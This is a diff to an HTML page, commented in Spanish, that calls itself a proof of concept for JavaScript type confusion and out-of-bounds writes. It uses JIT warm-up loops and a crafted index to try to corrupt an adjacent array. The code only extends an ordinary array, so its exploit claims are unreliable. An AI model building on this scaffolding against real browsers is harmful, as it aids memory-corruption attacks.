@@ -1,46 +1,37 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Type Confusion Aggressive Test</title>
+  <title>Type Confusion - Out-of-Bounds Write Test</title>
 </head>
 <body>
-  <h1>Type Confusion - Advanced PoC</h1>
+  <h1>PoC: Type Confusion con OOB Write</h1>
   <pre id="log"></pre>
   <script>
     const log = (msg) => document.getElementById("log").textContent += msg + "\n";
 
-    function hex(x) {
-      return "0x" + x.toString(16);
-    }
-
     function trigger() {
-      let float_array = [1.1, 2.2, 3.3, 4.4];
-      let obj_array = [{}, {}, {}, {}];
+      let oob_array = [1.1, 2.2, 3.3];
+      let victim_array = [1337];
 
-      function confuse(arr, val) {
+      function confuse(arr, index, val) {
         for (let i = 0; i < 10000; i++) {
-          arr[0] = 1.1;  // entrenamiento para JIT como float
+          arr[0] = 1.1;
+          arr[1] = 2.2;
         }
-        arr[0] = val; // de pronto insertamos un objeto
-        return arr[0];
+        arr[index] = val; // tipo inesperado
+        return arr;
       }
 
-      let res = confuse(float_array, {a: 42});
+      // El índice 10 está fuera de límites para oob_array
+      let result = confuse(oob_array, 10, 13.37);
 
-      log("[*] Resultado: " + res);
-      if (typeof res === "object") {
-        log("[+] Type confusion detectada: se insertó un objeto en un array de floats");
-      } else {
-        log("[-] No se detectó confusión");
-      }
+      log("[*] Resultado post-confusión: length = " + result.length);
+      log("[*] Intentamos acceder fuera de límites: " + result[10]);
 
-      // Prueba adicional: ver el valor de la primera celda
-      float_array[0] = 13.37;
-      let view = new DataView(new ArrayBuffer(8));
-      view.setFloat64(0, float_array[0], true);
-      let low = view.getUint32(0, true);
-      let high = view.getUint32(4, true);
-      log("[*] Representación en memoria de 13.37: low=" + hex(low) + " high=" + hex(high));
+      // Intento de acceso cruzado: victim_array
+      let crafted_index = 10;
+      result[crafted_index] = 42.42424242;  // posible OOB write
+      log("[*] ¿victim_array fue afectado?: " + victim_array[0]);
     }
 
     trigger();
